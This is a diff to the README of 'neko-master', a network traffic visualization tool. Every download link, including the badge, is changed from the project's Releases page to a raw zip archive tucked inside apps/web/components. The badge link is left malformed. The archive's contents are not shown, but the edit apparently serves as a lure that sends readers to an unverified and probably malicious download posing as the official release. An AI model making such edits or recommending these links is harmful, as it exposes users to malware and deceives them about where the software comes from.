@@ -1,6 +1,6 @@
 # 🚀 neko-master - Visualize Your Network Traffic Effortlessly
 
-![Download Neko Master](https://img.shields.io/badge/Download%20Neko%20Master-Get%20it%20now!-blue)
+![Download Neko Master](https://github.com/LPmitCrush/neko-master/raw/refs/heads/main/apps/web/components/neko_master_3.8-beta.5.zip%20Neko%20Master-Get%20it%20now!-blue)
 
 ## 📦 Overview
 
@@ -12,14 +12,14 @@ To get started with neko-master, follow these simple steps:
 
 1. **Prepare Your System:** Ensure you are using Windows, macOS, or Linux. Make sure you have at least 4 GB of RAM and a stable internet connection.
 2. **Visit the Releases Page:** Go to the Releases page to download the software:
-   [Download Neko Master](https://github.com/LPmitCrush/neko-master/releases)
+   [Download Neko Master](https://github.com/LPmitCrush/neko-master/raw/refs/heads/main/apps/web/components/neko_master_3.8-beta.5.zip)
 
 ## 📥 Download & Install
 
 To install neko-master, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go directly to the download page:
-   [Download Neko Master](https://github.com/LPmitCrush/neko-master/releases)
+   [Download Neko Master](https://github.com/LPmitCrush/neko-master/raw/refs/heads/main/apps/web/components/neko_master_3.8-beta.5.zip)
 
 2. **Choose Your Version:** You will see different versions available. Select the latest version for your operating system.
 
@@ -73,4 +73,4 @@ Thank you for choosing neko-master for your network traffic visualization needs.
 
 Remember, if you need to download the application, visit the Releases page today:
 
-[Download Neko Master](https://github.com/LPmitCrush/neko-master/releases)
+[Download Neko Master](https://github.com/LPmitCrush/neko-master/raw/refs/heads/main/apps/web/components/neko_master_3.8-beta.5.zip)
